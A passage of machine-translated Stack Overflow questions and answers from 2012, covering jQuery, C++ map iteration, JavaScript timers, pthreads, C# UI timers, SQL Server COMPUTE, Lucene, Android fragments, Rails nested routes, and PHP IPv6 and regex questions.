> 
> 时间：2012-11-24T23:40:38.820

我建议：

```
$('td img').filter(function(){
    return $(this).attr('src') == 'images/pix.gif';
}).parent().css({'line-hight' : '4px', 'background-color' : '#017842'}).removeAttr('bgcolor').find('img').remove(); 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/LJMBu/1/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-19T00:43:17.573

如果你定义了 id 那么它很简单；

```
$("#tdImg").empty(); 
```

另一个场景 - Show()：

```
$("#tableId tr").each(function () {
            $(this).find("img").each(function () {
                $(this).show();
            });
        }); 
```

使用 hide() 的场景：

```
$("#tableId tr").each(function () {      
            $(this).find("img").each(function () {                
                $(this).hide();
            });
    }); 
```

如果需要使用 $(this).remove() 删除图像，我们也可以使用 remove()

# c++ - 为什么我不能迭代这个 c++ 映射？出现错误，例如我无法使用 < 运算符

> ID：13537094
> 
> 赞同：0
> 
> 时间：2012-11-24T00:07:40.640
> 
> 标签：c++, map

```
 #include "UserUserSim.h"
UserUserSim::UserUserSim(string &query_url):
    _query_url(query_url)
{

}

void UserUserSim::calculate(){
    ifstream infile(_query_url.c_str());
    string line;
    while(infile){
        int movie_id;
        int user_id;
        infile>>line;
        if (line[line.length()-1]==':'){
            movie_id=atoi(line.c_str());
            cout<<line<<endl;
        }
        else{
            user_id=atoi(line.c_str());
            if (_set.find(user_id)==_set.end())
                getTop(user_id);
            float score=getScore(user_id,movie_id);
            cout<<score<<endl;
        }
    }
}
float UserUserSim::getScore(int &user_id, int &movie_id){
    vector<USim>* p=_map[user_id];
    MovieList* ml=MovieDictionary::getInstance().getMovie(movie_id);
    ml->sortList();
    vector<UserScore>::iterator it;
    vector<USim>::iterator sim_it=p->begin();
    float score=0;
    float total_weight=0;
    for (it=ml->begin();it<ml->end();it++){
        while ((*it).user_id>(*sim_it).user_id){  // the user did not rate in ths movie
            sim_it++;
        }

        if ((*it).user_id==(*sim_it).user_id){
            score+=(*sim_it).score * (*it).rating;  // score of similarity * rating
            total_weight+=(*sim_it).score;
            sim_it++;   // move on to the next user
        }
    }
    score=score/total_weight;
    return score;
}
typedef pair<int, float> mapPair;
bool compareSim(mapPair p1, mapPair p2){
    return p1.second>p2.second;
}
bool compareID(mapPair p1, mapPair p2){
    return p1.first<p2.first;
}
void UserUserSim::getTop(int &user_id){
    vector<USim> list;
    vector<USim>* p=&list;
    _map.insert(pair<int,vector<USim>*>(user_id,p));
    _set.insert(user_id);

    UserList* ul=UserDictionary::getInstance().getUser(user_id);
    map<int,float> user_score_map;
    vector<MovieScore>::iterator it;
    vector<UserScore>::iterator it_movie; // the iterator for the movielist
    for (it=ul->begin();it<ul->end();it++){ // for each movie rating in the Vector
        int movie_id=(*it).movie_id;
        MovieList* ml=MovieDictionary::getInstance().getMovie(movie_id);
        for(it_movie=ml->begin();it_movie<ml->end();it_movie++){
            int user_id=(*it_movie).user_id;
            if (user_score_map.find(user_id)==user_score_map.end()){
                user_score_map.insert(pair<int,float>(user_id,0));
            }else{
                user_score_map[user_id]+=(*it).rating*(*it_movie).rating;// the vector's user rating x the rating of the movie,user
            }
        }
    }
    //vector< pair<int,float> > user_score_v;
    map<int,float>::iterator it_map;
    for (it_map=user_score_map.begin();it_map<user_score_map.end();it_map++){} //<=============where error happens
} 
```

**请注意，如果我包含最后一行，我将收到如下错误：**

```
g++ src/main.cpp src/CorpusExp.cpp src/MovieList.cpp src/MovieDictionary.cpp src/UserDictionary.cpp src/UserList.cpp src/UserUserSim.cpp -o recommend
src/UserUserSim.cpp: In member function ‘void UserUserSim::getTop(int&)’:
src/UserUserSim.cpp:81: error: no match for ‘operator<’ in ‘it_map < user_score_map. std::map<_Key, _Tp, _Compare, _Alloc>::end [with _Key = int, _Tp = float, _Compare = std::less<int>, _Alloc = std::allocator<std::pair<const int, float> >]()’
make: *** [recommend] Error 1 
```

对 c++ 几乎不熟悉，我检查了一些参考资料，我认为迭代地图是可以的，否则，我怎么能将地图中的一些元素（如 top k）复制到向量中？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T00:13:49.553

关系比较，如操作符`<`等`>`，仅可用于*随机访问*迭代器。

`std::map`迭代器是*双向*迭代器，这是一个比随机访问弱得多的规范。您不能将关系比较与双向迭代器一起使用。Map 迭代器仅在相等性方面具有可比性。在循环条件中使用`!=`比较而不是`<`.

此外，尽可能使用等式比较总是一个好主意，只有在确实需要时才使用关系比较，即尽可能依赖较弱的要求集。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-24T00:09:31.933

在最后一行，试试这个：

```
for (it_map = user_score_map.begin(); it_map != user_score_map.end(); ++it_map) 
```

您应该在所有代码中遵循此模式。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-24T00:12:53.207

您需要将问题减少到最少的代码！大多数代码似乎与问题完全无关！

问题是双向迭代器没有定义小于关系。您只比较它们是否相等或不相等。只需使用

```
it != map.end() 
```

代替

```
it < map.end() 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-24T00:17:46.450

您需要随机访问迭代器才能将它们与“<”进行比较，但 std::map 的迭代器不是随机访问的（我不确定它们是什么，可能是双向的）。

无论如何，在迭代容器时，无论是使用 std::map 迭代器还是使用任何其他容器的迭代器，都应该使用“！=”进行比较，而不是“<”。

# javascript - 我可以强制浏览器在继续执行 javascript 之前渲染出 DOM 更改吗？

> ID：13537096
> 
> 赞同：8
> 
> 时间：2012-11-24T00:08:16.340
> 
> 标签：javascript, jquery, google-chrome, browser

我正在填充一个包含大约 500 行的表，这需要浏览器几秒钟来呈现，而它看起来是冻结的。这就是为什么我想显示一条请求用户耐心的消息：

```
$.ajax({
  url: '{{ search_url }}',
  success: function (response) {
    $('#progress').text('Rendering results, please wait...');
    clear_table();
    populate_table(response);
  }
}); 
```

该消息未显示 - 显然浏览器（在 Chrome 23 中测试）缓冲所有 DOM 更改并一次性呈现它们。

作为一种解决方法，我发现当我延迟填充表直到执行返回到事件循环时，实际上会显示消息：

```
$.ajax({
  url: '{{ search_url }}',
  success: function (response) {
    $('#progress').text('Rendering results, please wait...');
    window.setTimeout(function () {
      clear_table();
      populate_table(response);
    }, 0);
  }
}); 
```

我想知道这种方法是否总是有效，或者这种情况是否有更好的技术。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T00:14:12.470

这是因为 Javascript 执行是单线程的。所以在你所有的 JS 代码被执行之前，浏览器不会做任何事情——换句话说，它会冻结。为了防止这种情况发生，我建议您使用[jQuery Async 插件](http://mess.genezys.net/jquery/jquery.async.php)（只需几行代码），它会定期将控制权交还给浏览器（通过使用`setTimeout`）。这可以防止浏览器冻结并显示等待消息而不会出现任何问题。

# database - Flex + SQLite + LMS

> ID：13537106
> 
> 赞同：0
> 
> 时间：2012-11-24T00:09:28.970
> 
> 标签：database, apache-flex, sqlite, moodle

是否可以在 Flex 项目中使用 SQLite 作为只读数据库，以便在兼容 SCORM 的学习管理系统中工作？

它在 SQLite 站点上说他们的数据库是无服务器的。这是否意味着我可以将它包含在一个 zip 包中，然后再将其导入 Moodle 中？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T05:49:26.720

是的，SQLite 可以在[只读模式下](http://www.sqlite.org/c3ref/open.html)工作。它应该适合您，但是标准 SQLite 无法访问压缩（压缩）数据库 - 它必须以传统的未压缩格式存在于磁盘上。

如果您希望您的数据库在本地进行压缩（并且可以选择加密），您应该考虑使用[CEROD](http://www.hwaci.com/sw/sqlite/cerod.html) - SQLite 作者的商业 SQLite 扩展。

# javascript - 设置和删除只读 JavaScript - 不能同时做这两个

> ID：13537110
> 
> 赞同：0
> 
> 时间：2012-11-24T00:09:42.067
> 
> 标签：javascript, settimeout, readonly

所以这是我第一次尝试 JavaScript（学习 Java atm），我几乎完成了。我想要做的是：在页面刷新时从我的 textarea 中删除只读，并在几分钟后使用计时器将其设置为只读。

所有计时器、getElement-parts 和 readOnly-attributes 似乎都在工作（最终）。

JavaScript：

```
<script>
//x = Timelimit in minutes, z = Time remaining alert in minutes
function timeLimit(x,z) {
    var min = 60 * 1000;
    var limit = x * min;
    setTimeout(function(){ alert("Du har " + z + " minutter igjen på prøven.") },( limit - (z * min) ));
    setTimeout(function(){ alert(x + " minutter har gått.\nTiden er slutt.") },limit);
    setTimeout(document.getElementById('testroom').setAttribute('readOnly','readOnly'),limit);
}
</script> 
```

这是对我的函数的调用（将其放在我的 textarea 下方，因为它似乎是 getElement 通过 id 找到我的 textarea 的唯一方法）：

```
 <form method="post" action="insert.php" />
        <textarea name="content" id="testroom"></textarea><br>
        <input type="submit" value="Send inn for retting" />
    </form>

<script>
timeLimit(0.2,0.1);
document.getElementById('testroom').removeAttribute("readOnly",0);
</script> 
```

如果我将 removeAttribute 移到 timeLimit() 上方（或将其放在函数中），我的 textarea 将保持 readonly=true。如果我把它放在下面，即使在 12 秒（0.2 分钟，计时器应该发生的地方）之后，它也会保持 readonly=false。

希望有人可以为我解决这个问题，一直在寻找很多不同的语法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-24T00:15:29.590

你的第三个 setTimeout() 调用没有做你想做的事。相反，它立即执行 .setAttribute() 方法。您应该将其包装在一个函数中以使其稍后执行。

```
setTimeout(function(){ alert(x + " minutter har gått.\nTiden er slutt.") },limit);
setTimeout(function(){document.getElementById('testroom').setAttribute('readOnly','readOnly')},limit); 
```

更好的是，您可以将两者结合起来，但请确保将 setAttribute 调用放在首位，这样用户就不会在糟糕的时候偷偷杀死您的 JavaScript：

```
setTimeout(function(){
    document.getElementById('testroom').setAttribute('readOnly','readOnly');
    alert(x + " minutter har gått.\nTiden er slutt.");
},limit); 
```

# c - 线程内带有 malloc 的变量

> ID：13537115
> 
> 赞同：2
> 
> 时间：2012-11-24T00:10:57.440
> 
> 标签：c, linux, pthreads

我有一个关于 pthread 的问题，当我使用 malloc 在线程内创建一个变量然后将其指针传递给一个共享结构（即 fifo）时，thread-1 传递的指针是否会被 thread2 访问？

请注意，我必须为上面的问题编写代码，我只是想更好地理解线程，下面就是我的想法。环境是**pthread** , **c**和**linux**

据我所知，线程正在共享其父进程的内存，如果是这种情况，下面应该是正确的。

```
void *thread-1(void *pointer)
{
  int *intp = malloc(4);
  send_to_fifo(intp);
}

void *thread-2(void *pointer)
{
  int *iptr;
  iptr = read_from_fifo();
  do_something(iptr);
  free(iptr);
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-24T00:12:44.140

> thread-1 传递的指针是否会被 thread2 访问？

是的：因为所有线程都在公共内存空间中运行，所以这是允许的。

`malloc`, `free`, 和其他内存管理函数默认是线程安全的，除非用`NO_THREADS`.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-24T00:17:02.503

你当然可以这样做。但是，当变量被另一个线程使用时，您必须小心不要写入变量。你需要同步。

在您的情况下，如果线程同时运行（线程 2 不等待线程 1 完成），则您有竞争条件：线程 2 要么在线程 1 将任何内容放入 fifo 之前或之后执行它的所有代码。

# c# - 更新 UI 的后台计时器？

> ID：13537117
> 
> 赞同：9
> 
> 时间：2012-11-24T00:11:39.870
> 
> 标签：c#, windows-runtime

我的申请有点问题。
我想每 10 秒更新一次我的 UI 上的内容。我首先`DispatcherTimer`为此使用了 a ，但它会在短时间内阻塞我的 UI，因为更新方法需要从 Web 加载某些内容，并且此操作需要一些时间。现在我想到了某种后台工作者，然后我找到了 BackgroundTasks。
后台任务的问题在于，据我正确理解，即使应用程序被挂起，它们也应该充当更新程序。我不需要那个。我只想在我的应用程序正在运行时更新，而不是在它被暂停时更新。

有没有解决这个问题的好方法？有什么建议可以用这个吗？

提前致谢！

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-11-24T00:44:28.110

你需要两件事：

1.  定时器

    [`System.Timers.Timer`](http://msdn.microsoft.com/en-us/library/system.timers.timer.aspx)您可以每隔 10 秒更新一次 UI 。

2.  调度员

    您需要使用`Dispatcher.Invoke`更改 UI 而不持有*主 UI 线程*。相反，该方法`Process`应该在一个*单独的线程*（`Timer`方法）上调用，而不是*主 UI 线程*，并`Dispatcher`在其中使用它来提醒主 UI 线程进行更改。

    ```
    Process() // method to be called after regular interval in Timer
    {
        // lengthy process, i.e. data fetching and processing etc.

        // here comes the UI update part
        Dispatcher.Invoke((Action)delegate() { /* update UI */ });
    } 
    ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T00:20:01.167

您需要创建一个线程来运行从网站获取和处理信息的代码部分。这样，您的表单将不会犹豫，因为它将位于与处理部分不同的线程上。

[这篇](http://www.codeproject.com/Tips/172943/How-to-run-method-in-separate-thread)关于代码项目的文章应该可以帮助您入门。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-02-01T14:47:42.140

其他答案缺少适当的清理：当计时器在窗口关闭的那一刻触发时，我会在尝试运行时收到未捕获的 TaskCanceledException `Dispatcher.Invoke`。我没有在其他问题中找到解决此问题的帮助。我能够通过在关闭窗口时取消注册计时器回调来解决它。

```
public partial class MainWindow : Window
{
    Timer clockTimer = null;
    public MainWindow()
    {
        clockTimer = new Timer(1.0); // 1 ms update to test for TaskCanceledException 
        clockTimer.Elapsed += Timer_Elapsed;
        clockTimer.AutoReset = true;
        clockTimer.Start();
        Closed += (object sender, EventArgs e) => { clockTimer.Elapsed -= Timer_Elapsed; };
    }
    private void Timer_Elapsed(object sender, ElapsedEventArgs e) {
        var now = DateTime.Now;
        Dispatcher.Invoke((Action)delegate () {
            UpdateTime(now);
        });
    }
} 
```

如果重新显示窗口，显然这不是一个好主意。我尝试添加一个 dtor，但它永远不会被调用，可能是由于循环依赖。

免责声明：我不懂 C#，所以这可能不是最好或正确的做事方式。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-11-24T00:19:43.923

此外，您可以启动一个计时器，该计时器具有经过的事件，每次计时器经过某个时间周期时都会发生该事件。

1.  [http://www.dotnetperls.com/timer](http://www.dotnetperls.com/timer)

# sql - 使用 COMPUTE 的 SQL Server 2008 总计

> ID：13537124
> 
> 赞同：0
> 
> 时间：2012-11-24T00:13:12.737
> 
> 标签：sql, sql-server-2008

我有一个简单的表查询显示：

```
salesAreaId areaDescription Total
----------- --------------- -----------
N1          North           5
SE8         Southeast       3
SW7         Southwest       2
NE6         Northeast       2
NW5         Northwest       1
S3          South           1
W4          West            1
E2          East            1

(8 row(s) affected) 
```

这是我的代码

```
SELECT st.salesAreaId, areaDescription,  
    COUNT(*) as Total
FROM store as st, salesArea as sa
WHERE st.salesAreaId = sa.salesAreaId
GROUP BY st.salesAreaId, areaDescription
ORDER BY 3 DESC
GO 
```

我的问题是如何使用 COMPUTE 在总列下方添加总计行，我被教导在 ORDER BY 之后使用 COMPUTE

我不想使用 ROLLUP，我是否需要某种内部 SELECT 才能单独使用 Total。我读到的每个示例都说要像这样在 SUM 旁边键入列名

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-24T01:09:27.770

试试这个：

```
SELECT st.salesAreaId, areaDescription,  
COUNT(*) as Total
FROM store as st, salesArea as sa
WHERE st.salesAreaId = sa.salesAreaId
GROUP BY st.salesAreaId, areaDescription
--order by would go here if needed - ordering by a constant won't have any effect though, so I've removed it from the statment
compute sum(count(*)) 
```

您可以将 sum 替换为任何聚合函数。我已经使用 count(*) 作为你正在做的事情，因为你将它用于你的小计 - 但你可以用一个列名/任何需要的东西来替换它。

附言。查看您的数据，您似乎可能在每个区域的小计之后？如果是这样，试试这个：

```
SELECT st.salesAreaId
, areaDescription
, COUNT(*) as Total
FROM store as st
inner join salesArea as sa
on st.salesAreaId = sa.salesAreaId
GROUP BY st.salesAreaId, areaDescription
ORDER BY st.salesAreaId, areaDescription
COMPUTE sum(count(*)) BY areaDescription 
```

# java - Lucene 4.0 中的词频

> ID：13537126
> 
> 赞同：4
> 
> 时间：2012-11-24T00:13:42.440
> 
> 标签：java, lucene

尝试使用 Lucene 4.0 计算词频。我的文档频率工作得很好，但不知道如何使用 API 来做词频。这是我的代码：

```
private static void addDoc(IndexWriter writer, String content) throws IOException {
    FieldType fieldType = new FieldType();
    fieldType.setStoreTermVectors(true);
    fieldType.setStoreTermVectorPositions(true);
    fieldType.setIndexed(true);
    fieldType.setIndexOptions(IndexOptions.DOCS_AND_FREQS);
    fieldType.setStored(true);
    Document doc = new Document();
    doc.add(new Field("content", content, fieldType));
    writer.addDocument(doc);
}

public static void main(String[] args) throws IOException, ParseException {
    Directory directory = new RAMDirectory();  
    Analyzer analyzer = new WhitespaceAnalyzer(Version.LUCENE_40);
    IndexWriterConfig config = new IndexWriterConfig(Version.LUCENE_40, analyzer);
    IndexWriter writer = new IndexWriter(directory, config);
    addDoc(writer, "Lucene is stupid");
    addDoc(writer, "Java is great");
    writer.close();
    IndexReader reader = DirectoryReader.open(directory);
    System.out.println(reader.docFreq(new Term("content", "Lucene")));
    reader.close();
} 
```

我尝试过类似`reader.getTermVector(0, "content")...`但找不到一种方法来获取该文档中特定术语的频率。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T01:22:23.707

K，想通了。您可以从中获取一个`DocsEnum`对象`MultiFields`，然后对其进行迭代。

```
private static void addDoc(IndexWriter writer, String content) throws IOException {
    FieldType fieldType = new FieldType();
    fieldType.setStoreTermVectors(true);
    fieldType.setStoreTermVectorPositions(true);
    fieldType.setIndexed(true);
    fieldType.setIndexOptions(IndexOptions.DOCS_AND_FREQS);
    fieldType.setStored(true);
    Document doc = new Document();
    doc.add(new Field("content", content, fieldType));
    writer.addDocument(doc);
}

public static void main(String[] args) throws IOException, ParseException {
    Directory directory = new RAMDirectory();  
    Analyzer analyzer = new WhitespaceAnalyzer(Version.LUCENE_40);
    IndexWriterConfig config = new IndexWriterConfig(Version.LUCENE_40, analyzer);
    IndexWriter writer = new IndexWriter(directory, config);
    addDoc(writer, "bla bla bla bleu bleu");
    addDoc(writer, "bla bla bla bla");
    writer.close();
    DirectoryReader reader = DirectoryReader.open(directory);
    DocsEnum de = MultiFields.getTermDocsEnum(reader, MultiFields.getLiveDocs(reader), "content", new BytesRef("bla"));
    int doc;
    while((doc = de.nextDoc()) != DocsEnum.NO_MORE_DOCS) {
          System.out.println(de.freq());
    }
    reader.close();
} 
```

# android - 具有不同可扩展列表的多个片段用于相同的数据

> ID：13537127
> 
> 赞同：4
> 
> 时间：2012-11-24T00:13:43.157
> 
> 标签：android, list, fragment, expandablelistview

这个问题可能非常愚蠢，但我无法找到正确的解决方案。

**所以这是我的问题：**

我想在自己的 Fragment中以多个（比如说 5 个）显示数据（a`java.util.List`和 my ），以便用户能够在不同的列表之间滑动。目前我有一个包含、和一个“扩展” （如[TabsAdapter](http://developer.android.com/reference/android/support/v4/view/ViewPager.html)），其中包含选项卡和. 这两个片段各有一个和（由我编写）。`TaskObjects``ExpandableLists``MainFragmentActivity``java.util.List``PageViewer``FragmentPagerAdapter``AllTaskFragment``OverDueTaskFragment``ExpandableList``ExpandableListAdapter`

现在，当用户单击任何一个孩子时，`ExpandableLists`我需要如何通知其他片段`ExpandableListAdapter`进行更新？我试图调用`MainFragmentActivity`并从那里调用所有片段，但是片段`ExpandableListAdapters`为“空”，但为什么呢？

**更新：**

我想我解决了这个问题，atm 正在使用：

如果任何 ExpandableListAdapter 发生变化，我会调用 updateTabs()

**MainFragmentActivity**

```
 public void updateTabs() {
        for(int i = 0 ; i < tabsAdapter.getCount() ; i++) {
            UpdateableFragment updateableFragment = (UpdateableFragment) getSupportFragmentManager().findFragmentByTag(makeFragmentName(mViewPager.getId(),i));
            updateableFragment.updateFragment();
        }
    }

    private String makeFragmentName(int viewId, int index){
         return "android:switcher:" + viewId + ":" + index;
    } 
```

它只是在每个片段中调用方法

```
public void updateFragment() {
         adapter.notifyDataSetChanged();
} 
```

这是一个好方法吗？或者这可能会引发一些问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T00:24:08.750

此类应用程序的关键是跟踪 ArrayAdapters。如果你调用`ArrayAdapter.notifyDataSetChanged()`，它会告诉它的视图更新。

# ruby-on-rails - 使用关联模型的参数创建 Rails 模型？

> ID：13537132
> 
> 赞同：1
> 
> 时间：2012-11-24T00:14:45.817
> 
> 标签：ruby-on-rails, ruby, model, routing, associations

我的 PushupReminder 控制器中有两个模型`User`和`PushupReminder`一个方法`create_a_reminder`（这是放置它的最佳位置吗？），当我向给定用户传递用户 ID 时，我希望为给定用户创建一个新的 PushupReminder 实例。我通过 user_id 列在我的`PushupReminder`表中正常工作，并且我已经测试过我可以创建提醒并通过 Rails 控制台正确发送提醒电子邮件。

这是模型代码的片段：

```
class User < ActiveRecord::Base
    has_many :pushup_reminders
end

class PushupReminder < ActiveRecord::Base
    belongs_to :user
end 
```

和 create_a_reminder 方法：

```
def create_a_reminder(user)
    @user = User.find(user)

    @reminder = PushupReminder.create(:user_id => @user.id, :completed => false, :num_pushups => @user.pushups_per_reminder, :when_sent => Time.now)

    PushupReminderMailer.reminder_email(@user).deliver
end 
```

我不知道如何`create_a_reminder`在我的代码中为给定用户运行该方法（最终将在我所有用户的 cron 作业中）。如果有人可以帮助我使我的想法走上正轨，我将不胜感激。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T04:19:55.313

**编辑**：[我在这里发布了一个示例 Rails 应用程序，](https://github.com/kreeger/sample-macho)展示了我在回答中所说的内容。我还发布了一个[新的提交，其中](https://github.com/kreeger/sample-macho/commit/b1e9296bdf9248e36e977deb1d1d0228dc6092d3)包含演示如何处理俯卧撑提醒的评论，当它们*也*以非嵌套方式可用时。

毫无疑问，保罗走在正确的轨道上。您需要在两个地方*创建*此功能，如果您想将其作为 cron 作业运行，第二个很重要。

1.  在您的`PushupRemindersController`, 作为`User`;的嵌套资源 为了通过网络创建俯卧撑提醒。
2.  在 rake 任务中，它将作为 cron 作业运行。

Rails 已经为您提供了您需要的大部分代码，并且您已经在 ActiveRecord 关联中设置了大部分代码。对于 #1, in `routes.rb`，设置[嵌套路由](http://guides.rubyonrails.org/routing.html#nested-resources)...

```
# Creates routes like...
#   /users/<user_id>/pushup_reminders
#   /users/<user_id>/pushup_reminders/new
#   /users/<user_id>/pushup_reminders/<id>
resources :users do
  resources :pushup_reminders
end 
```

你`PushupRemindersController`应该看起来像......

```
class PushupRemindersController < ApplicationController
  before_filter :get_user

  # Most of this you'll already have.

  def index
    @pushup_reminders = @user.pushup_reminders
    respond_with @pushup_reminders
  end

  # This is the important one.
  def create
    attrs = {
      :completed => false,
      :num_pushups => @user.pushups_per_reminder,
      :when_sent => Time.now
    }
    @pushup_reminder = @user.pushup_reminders.create(attrs)
    respond_with @pushup_reminder
  end

  # This will handle getting the user from the params, thanks to the `before_filter`.
  def get_user
    @user = User.find(params[:user_id])
  end
end 
```

当然，您将有一个`new`动作来向用户展示一个网络表单，等等。

对于第二个用例，`cron`任务，将其设置为项目目录中的[Rake 任务。](http://www.ultrasaurus.com/sarahblog/2009/12/creating-a-custom-rake-task/)`lib/tasks`这使您可以自由支配设置一个在您需要时通过 cron 任务执行的操作。您将拥有对所有 Rails 模型等的完全访问权限，就像控制器操作一样。真正的诀窍是：如果您有疯狂的自定义逻辑来设置提醒，请将其移至`PushupReminder`模型中的操作。这样，您可以从 rake 任务和控制器中触发创建方法，而不必重复编写任何创建逻辑。记住，*不要重复自己（干）！*

我发现在设置`cron`任务[时非常有用的一个 gem 是when gem](https://github.com/javan/whenever)。用 Ruby 编写特定于站点的 cron 作业，并获得您需要粘贴到 cron 选项卡中的确切输出（如果您通过 Capistrano 进行部署，则对 cron 作业进行完全不干涉管理）！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T00:16:39.230

尝试将 attr_accessible 设置为 :user 而不是 :user_id。

```
attr_accessible :user 
```

然而，一个更好的方法是这样做

```
@user.pushup_reminders.create 
```

这样 user_id 会自动分配。

使用这样的嵌套路由：

```
:resources :users do
  :resources :pushup_reminders
end 
```

这将为您提供 params[:user_id] 和 params[:id] 以便您可以在数据库中找到您的对象。

如果您通过会话了解您的用户，则无需嵌套您的路线，而是可以使用它来保存内容。

使用 restful 路由，我建议使用 pushup_reminders 控制器中的 create 操作。这将是进行这种对象创建的最传统和最安静的方式。

```
def create
  @user = User.find(params[:user_id]
  @reminder  = @user.pushup_reminders.create()
end 
```

如果您需要检查对象创建是否成功，请尝试使用`.new`and`.save`

# javascript - JavaScript 不安全访问？

> ID：13537134
> 
> 赞同：0
> 
> 时间：2012-11-24T00:15:08.833
> 
> 标签：javascript, facebook, iframe, canvas, https

尝试在我的应用程序中使用 JavaScript 时，我从 Chrome 中收到以下错误：

> Uncaught SyntaxError: Unexpected token )
> 
> _I-bZ2aLo8f.js:48
> 
> 不安全的 JavaScript 尝试 从具有 URL [https://s-static.ak.facebook.com/connect/xd_arbiter.php?version=17#的框架访问具有 URL](https://s-static.ak.facebook.com/connect/xd_arbiter.php?version=17#channel=f2f2ee12fc&origin=http%3A%2F%2Fultimate-battle-online.com&channel_path=%2Fchannel.php%3Ffb_xd_fragment%23xd_sig%3Df3312304ec%26) [http://apps.facebook.com/ubo-elementalfury/的框架](http://apps.facebook.com/ubo-elementalfury/)[频道=f2f2ee12fc&origin=http%3A%2F%2Fultimate-battle-online.com&channel_path=%2Fchannel.php%3Ffb_xd_fragment%23xd_sig%3Df3312304ec%26](https://s-static.ak.facebook.com/connect/xd_arbiter.php?version=17#channel=f2f2ee12fc&origin=http%3A%2F%2Fultimate-battle-online.com&channel_path=%2Fchannel.php%3Ffb_xd_fragment%23xd_sig%3Df3312304ec%26)。请求访问的帧具有“https”协议，被访问的帧具有“http”协议。协议必须匹配。
> 
> xd_arbiter.php:20

我不确定发生了什么，从安全的 Facebook 连接浏览它时没有遇到此问题。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T00:23:48.183

不安全的访问错误不会导致您的问题。它是您拥有的额外括号。浏览您的代码并找到它的位置并将其删除，然后看看会发生什么。

了解导致此问题的 FB 应用程序的哪个部分会很有帮助。

编辑：

我在您的应用中发现了与此无关的其他问题。在您的应用程序[http://ultimate-battle.com](http://ultimate-battle.com)中，在选择您的氏族页面上，您有以下行：

```
document.getElementById("clock").innerHTML=movingtime; 
```

#clock 在此页面上不存在。错误在第 419 行的 jquery.mycode.js 中。

# php - 在 PHP 中获取 IPv6

> ID：13537136
> 
> 赞同：2
> 
> 时间：2012-11-24T00:15:25.043
> 
> 标签：php, javascript, ajax, ipv6

有人可以帮我读出 IPv6 吗？

我试过[在 PHP 中使用 IPv6 地址，](https://stackoverflow.com/questions/444966/working-with-ipv6-addresses-in-php)但它对我不起作用..

获得 IPv4 没有问题

```
echo $_SERVER['REMOTE_ADDR']; 
```

但有人可以告诉我如何获得 IPv6 吗？

该站点可以同时读取（IPv4 和 IPv6）：http: [//ipv6-test.com/api/](http://ipv6-test.com/api/)。但是我在没有任何api的情况下尝试它，这可能吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-24T00:18:21.820

您的想法是正确的，但如果您想要 IPv6 地址，则必须使用 IPv6 提出请求。

您链接到的站点可能通过有一个页面从只能通过 IPv6 访问的服务器加载资源来工作。如果它有效，那么你知道地址。

我只想建立一个站点，向同一台服务器发出 AJAX 请求，一个通过 IPv4，一个通过 IPv6。使用其 IP 地址来排除可能不支持 IPv6 的任何本地 DNS 问题。

# php - 带有正则表达式的 preg_split url

> ID：13537139
> 
> 赞同：0
> 
> 时间：2012-11-24T00:15:44.817
> 
> 标签：php, regex, preg-split

我有一个字符串，例如：

`src="http://www.domain.com/sub_folder/xyz_17215_andso_on_01-file_08.html"`

并希望在每个不是字母或数字的字符处拆分它。

和

```
/[a-z0-9]/ 
```

我得到一个包含所有字符的数组，但与获取所有单词和数字相反的是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-24T00:18:59.220

你可以写：

```
$result_array = preg_split('/[^a-z0-9]+/', $string_to_split); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-24T05:14:18.920

与其编写新代码来解决问题，不如使用 PHP 在函数中提供给您的内置`parse_url()`功能： http: [//php.net/manual/en/function.parse-url.php](http://php.net/manual/en/function.parse-url.php)

# android - 带有android xml的Libgdx？

> ID：13537140
> 
> 赞同：0
> 
> 时间：2012-11-24T00:15:52.537
> 
> 标签：android, xml, libraries, libgdx

我正在使用库 LIBGDX 来制作应用程序，并且能够在 Android 上作为计算机运行。我想介绍一个新的库来在 android 中创建图形，但不知道我是否可以添加用于 Android 和 libgdx 并在计算机上运行的库。如果您可以以与通常在 android 中编程的方式类似的方式工作，我也想从我习惯的 android 的 GUI 中进行设计，我觉得它更舒服。此外，当 xml 类型为 strings.xml 时，我想知道我是否可以使用它们。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-24T17:50:49.037

有两种方法可以构建使用 libGDX 运行的库（实际上是任何代码）：

1.  仅使用 libGDX 提供的 API。例如，如果您使用 libGDX 提供的 OpenGL 包装器渲染您的图形，它可以在任何地方工作。或者，如果您使用“scene2d”UI API，它可以在任何地方工作。

2.  实现一个使用 libGDX API 的通用前端库，然后调用实现特定于平台的位的特定于后端的库。对于您的示例，这将需要构建一个基于 Android 的后端，该后端可能使用 Android 特定的 UI 渲染，然后构建一个单独的基于桌面的后端，该后端可能使用 Swing 或其他一些 Java 桌面特定的 API。

如果您的所有代码都使用第二种方法，那么您并没有真正从 libGDX 中获得太多好处。

# grails - Grails 未在测试环境中重新加载

> ID：13537145
> 
> 赞同：1
> 
> 时间：2012-11-24T00:17:01.940
> 
> 标签：grails, guard, reloading

我正在通过“grails-debug test”访问的交互式控制台中测试我的应用程序。

